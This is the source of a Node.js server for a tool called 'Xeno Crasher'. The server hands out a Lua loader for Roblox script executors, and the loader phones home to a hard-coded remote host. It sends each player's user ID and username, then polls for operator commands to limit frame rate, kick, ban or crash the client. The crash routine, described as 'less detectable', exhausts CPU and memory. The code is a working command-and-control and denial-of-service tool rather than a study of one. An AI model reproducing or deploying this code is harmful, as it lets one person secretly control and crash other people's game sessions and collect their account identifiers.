const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

// ============================================
// AUTH CONFIG (server-side only)
// ============================================
const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'CHANGE_ME_IN_ENV';
const API_KEY = process.env.API_KEY || 'xenooooo';
const SESSION_TTL = 1000 * 60 * 60 * 4; // 4 hours

const sessions = new Map(); // token -> expiry

function makeToken() {
    return crypto.randomBytes(32).toString('hex');
}

function requireAuth(req, res, next) {
    const token = req.headers['x-session-token'] || req.query.token;
    if (!token) return res.status(401).json({ error: 'No token' });
    const exp = sessions.get(token);
    if (!exp || exp < Date.now()) {
        sessions.delete(token);
        return res.status(401).json({ error: 'Invalid or expired token' });
    }
    next();
}

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key', 'X-Session-Token']
}));
app.use(express.json({ limit: '10mb' }));

// ============================================
// STATE
// ============================================
const players = new Map();
const bannedPlayers = new Map();

// ============================================
// AUTH ROUTES
// ============================================
app.post('/api/auth/login', (req, res) => {
    const { password } = req.body || {};
    if (!password) return res.status(400).json({ error: 'Missing password' });

    const a = Buffer.from(String(password));
    const b = Buffer.from(PANEL_PASSWORD);
    const ok = a.length === b.length && crypto.timingSafeEqual(a, b);
    if (!ok) return res.status(401).json({ error: 'Invalid password' });

    const token = makeToken();
    sessions.set(token, Date.now() + SESSION_TTL);
    res.json({ token, expires: Date.now() + SESSION_TTL });
});

app.post('/api/auth/logout', requireAuth, (req, res) => {
    const token = req.headers['x-session-token'];
    sessions.delete(token);
    res.json({ ok: true });
});

app.get('/api/auth/check', requireAuth, (req, res) => {
    res.json({ ok: true });
});

// ============================================
// LOADER SCRIPT
// ============================================
app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher - WITH BAN + FPS FIX ]]--
local BASE = "${PUBLIC_URL}"
local KEY = "${API_KEY}"

local HttpService = game:GetService("HttpService")

local function sendRequest(method, url, data)
    local options = {
        Url = url,
        Method = method,
        Headers = {
            ["Content-Type"] = "application/json",
            ["X-Api-Key"] = KEY
        }
    }
    if method == "POST" and data then
        options.Body = data
    end

    local success, result = pcall(function()
        if syn and syn.request then
            return syn.request(options)
        elseif request then
            return request(options)
        elseif http and http.request then
            return http.request(options)
        elseif fluxus and fluxus.request then
            return fluxus.request(options)
        elseif http_request then
            return http_request(options)
        else
            return HttpService:RequestAsync(options)
        end
    end)

    if success and result then
        if type(result) == "table" and result.Body then
            return result.Body
        elseif type(result) == "string" then
            return result
        end
    end
    return nil
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function heartbeat()
    local banCheckUrl = BASE .. "/api/public/checkban?user_id=" .. LP.UserId
    local banResult = sendRequest("GET", banCheckUrl, nil)
    if banResult and banResult ~= "" then
        local ok, banData = pcall(function() return HttpService:JSONDecode(banResult) end)
        if ok and banData and banData.banned == true then
            task.wait(0.5)
            LP:Kick("🔨 You have been banned from this session.")
            return
        end
    end

    local data = HttpService:JSONEncode({
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        executor = "XenoClient",
        online = true
    })
    sendRequest("POST", BASE .. "/api/public/heartbeat", data)
end

-- ============================================
-- FPS LIMITER (multi-method fallback)
-- ============================================
local fpsBinding = nil
local fpsConnection = nil
local fpsActive = false

local function clearFPS()
    if fpsBinding then
        pcall(function() RunService:UnbindFromRenderStep(fpsBinding) end)
        fpsBinding = nil
    end
    if fpsConnection then
        pcall(function() fpsConnection:Disconnect() end)
        fpsConnection = nil
    end
    fpsActive = false
end

local function setFPSLimit(targetFPS)
    clearFPS()

    targetFPS = tonumber(targetFPS)
    if not targetFPS or targetFPS <= 0 then
        -- try to restore default cap
        if setfpscap then pcall(function() setfpscap(60) end) end
        return
    end
    if targetFPS > 240 then targetFPS = 240 end

    -- Method 1: executor-native (most reliable)
    if setfpscap then
        local ok = pcall(function() setfpscap(targetFPS) end)
        if ok then return end
    end

    -- Method 2: BindToRenderStep busy-wait above Camera priority
    fpsActive = true
    local frameTime = 1 / targetFPS
    fpsBinding = "XenoFPSLimiter_" .. tostring(math.random(1, 1e9))

    local ok = pcall(function()
        RunService:BindToRenderStep(fpsBinding, Enum.RenderPriority.Camera.Value + 1, function(dt)
            if not fpsActive then return end
            local t0 = os.clock()
            local need = frameTime - dt
            if need > 0 then
                while (os.clock() - t0) < need do end
            end
        end)
    end)

    if not ok then
        -- Method 3: Heartbeat yield loop (weakest, no CPU spin)
        fpsBinding = nil
        local last = os.clock()
        fpsConnection = RunService.Heartbeat:Connect(function()
            if not fpsActive then return end
            local now = os.clock()
            local elapsed = now - last
            if elapsed < frameTime then
                task.wait(frameTime - elapsed)
            end
            last = os.clock()
        end)
    end
end

-- ============================================
-- CRASH (bounded, less detectable)
-- ============================================
local function crashGame()
    task.spawn(function()
        while true do
            local x = 0
            for i = 1, 500000 do x = x + i end
            task.wait()
        end
    end)
    task.spawn(function()
        local t = {}
        while true do
            for i = 1, 200 do t[#t + 1] = string.rep("X", 10000) end
            task.wait()
        end
    end)
end

-- ============================================
-- POLLING
-- ============================================
local pollRunning = false
local function poll()
    if pollRunning then return end
    pollRunning = true

    local url = BASE .. "/api/public/command?user_id=" .. LP.UserId
    local result = sendRequest("GET", url, nil)

    if result and result ~= "" then
        local ok, data = pcall(function() return HttpService:JSONDecode(result) end)
        if ok and data then
            if data.fps_limit ~= nil then
                if data.fps_limit == false or data.fps_limit == 0 then
                    setFPSLimit(nil)
                else
                    setFPSLimit(tonumber(data.fps_limit))
                end
            end

            if data.crash == true then crashGame() end

            if data.kick == true then
                local msg = data.kick_message or "You have been kicked."
                task.wait(0.5)
                LP:Kick(msg)
            end

            if data.ban == true then
                local msg = data.ban_message or "🔨 You have been banned from this session."
                task.wait(0.5)
                LP:Kick(msg)
            end
        end
    end

    pollRunning = false
end

heartbeat()
task.wait(3)

task.spawn(function()
    while true do
        poll()
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        heartbeat()
        task.wait(5)
    end
end)`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// PUBLIC CLIENT ENDPOINTS
// ============================================
app.get('/api/public/checkban', (req, res) => {
    const { user_id } = req.query;
    if (!user_id) return res.json({ banned: false });
    res.json({ banned: bannedPlayers.has(String(user_id)) });
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(data.user_id);

    if (bannedPlayers.has(userId)) return res.json({ status: 'banned' });

    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        // preserve pending commands
        _crash: existing._crash || false,
        _kick: existing._kick || false,
        _kick_message: existing._kick_message || '',
        _ban: existing._ban || false,
        _ban_message: existing._ban_message || '',
        fps_limit: existing.fps_limit !== undefined ? existing.fps_limit : false
    });

    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});

    const response = {};

    if (p.fps_limit !== undefined && p.fps_limit !== false) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._kick) {
        response.kick = true;
        response.kick_message = p._kick_message || "You have been kicked.";
        p._kick = false;
        p._kick_message = '';
    }
    if (p._ban) {
        response.ban = true;
        response.ban_message = p._ban_message || "🔨 You have been banned from this session.";
        p._ban = false;
        p._ban_message = '';
    }

    players.set(String(userId), p);
    res.json(response);
});

// ============================================
// PROTECTED ADMIN ENDPOINTS
// ============================================
app.get('/api/players', requireAuth, (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        if (bannedPlayers.has(id)) continue;
        const online = (now - (p.lastHeartbeat || 0)) < OFFLINE_THRESHOLD;
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.post('/api/command', requireAuth, (req, res) => {
    const { user_id, fps_limit, kick, kick_message, crash, ban, ban_message } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });

    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        p._kick_message = kick_message || "You have been kicked.";
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    if (ban === true) {
        p._ban = true;
        p._ban_message = ban_message || "🔨 You have been banned from this session.";
        bannedPlayers.set(userId, { username: p.username, bannedAt: Date.now() });
        console.log(`🔨 BAN SENT TO: ${p.username || userId}`);
    }

    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
